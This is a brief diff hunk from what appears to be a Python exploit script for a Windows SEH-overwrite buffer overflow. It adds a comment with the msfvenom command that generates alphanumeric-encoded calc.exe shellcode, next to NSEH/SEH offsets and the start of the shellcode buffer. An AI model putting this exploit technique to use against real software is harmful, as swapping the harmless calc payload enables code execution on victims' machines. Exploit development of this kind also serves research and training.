@@ -13,6 +13,7 @@ def make_string(offset):
     #pattern = subprocess.check_output(cmd, shell=True)
     #NSEH offset is 3491
     #SEH offset is 3495
+    # msfvenom -p windows/exec CMD="calc" EXITFUNC=seh BufferRegister=EDI -f python -e x86/alpha_mixed
     buf =  b""
     buf += b"\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
     buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
